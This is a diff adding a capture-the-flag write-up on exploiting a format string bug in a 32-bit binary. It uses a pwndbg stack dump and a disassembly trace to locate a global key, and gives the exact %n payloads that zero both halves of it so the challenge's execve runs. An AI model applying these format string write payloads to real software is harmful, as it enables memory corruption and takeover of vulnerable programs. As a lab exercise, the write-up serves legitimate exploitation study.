@@ -1,0 +1,47 @@
+Since PIE is disabled, we know the address of the key - 0x804a060. 
+ 
+The buffer read the data from the stack now let's analyze some memory and use the format string vulnerability to overwrite the key.
+
+Since the stack looks like this:
+pwndbg> x/44wx $esp
+0xffffaad0:	0x00000000	0x0804a100	0x00000064	0x00000000 -> the address of the buffer 
+0xffffaae0:	0x00000000	0x00000000	0x00000000	0x00000000
+0xffffaaf0:	0x00000000	0x08048870	0x00000000	0x00000000
+0xffffab00:	0xffffcf74	0xffffdfd1	0xffffab20	0xffffab24 -> we could see that 15 and the 16 addresses are on the stack 
+0xffffab10:	0x00000000	0x00000000	0xffffcda8	0x08048791
+0xffffab20:	0x00000000	0x00000000	0x00000000	0x00000000
+0xffffab30:	0x00000000	0x00000000	0x00000000	0x00000000
+0xffffab40:	0x00000000	0x00000000	0x00000000	0x00000000
+0xffffab50:	0x00000000	0x00000000	0x00000000	0x00000000
+0xffffab60:	0x00000000	0x00000000	0x00000000	0x00000000
+0xffffab70:	0x00000000	0x00000000	0x00000000	0x00000000
+
+
+we could see that we have some stack memory at 0xffff... that we could use %a$n to overwrite that memory (a is the place of the memoery).
+So I did that with %134520928x%15$n to write the address 0x804a060 and after that did %21$n to write 0 to the key.
+
+Then I tried to get the execve to work but got a little bit stuck. 
+I analyzed the memory again and tried some reversing with Ghidra. I finally got it!
+
+I forgot that the key is a long long and use 2 8 bytes we could also see that in GDB. 
+──────────────────────────────────────────────────────────────────────────────────────────────────────[ DISASM / i386 / set emulate on ]──────────────────────────────────────────────────────────────────────────────────────────────────────
+   0x804867b <fsb+327>    mov    edx, eax                        EDX => 0
+   0x804867d <fsb+329>    sar    edx, 0x1f
+   0x8048680 <fsb+332>    mov    dword ptr [ebp - 0x30], eax     [0xffffaae8] <= 0
+   0x8048683 <fsb+335>    mov    dword ptr [ebp - 0x2c], edx     [0xffffaaec] <= 0
+   0x8048686 <fsb+338>    mov    eax, dword ptr [0x804a060]      EAX, [key] => 0x9f24f653
+ ► 0x804868b <fsb+343>    mov    edx, dword ptr [0x804a064]      EDX, [key+4] => 0x8a0299e4
+   0x8048691 <fsb+349>    mov    ecx, edx                        ECX => 0x8a0299e4
+   0x8048693 <fsb+351>    xor    ecx, dword ptr [ebp - 0x2c]     ECX => 0x8a0299e4 (0x8a0299e4 ^ 0x0)
+   0x8048696 <fsb+354>    xor    eax, dword ptr [ebp - 0x30]     EAX => 0x9f24f653 (0x9f24f653 ^ 0x0)
+   0x8048699 <fsb+357>    or     eax, ecx                        EAX => 0x9f26fff7 (0x9f24f653 | 0x8a0299e4)
+   0x804869b <fsb+359>    test   eax, eax                        0x9f26fff7 & 0x9f26fff7     EFLAGS => 0x282 [ cf pf af zf SF IF df of ]
+
+0x804a060 <key>:	0x9f24f653	0x8a0299e4 (if we had an int we would have saw a cmp instruction)
+
+
+The program loads two memory addresses: 0x804a060 and 0x804a064 (this is probably why we have the for loop for 4 times). 
+
+Now I changed both of the values to 0  with the first input being %134520928x%15$n=0x804a060 and the 3 input %134520932x%15$n=0x804a064 and got it.
+
+Thank you to Alexandre CHERON for his blog https://axcheron.github.io/exploit-101-format-strings/ that taught me a lot about FSB and helped me with this challenge.
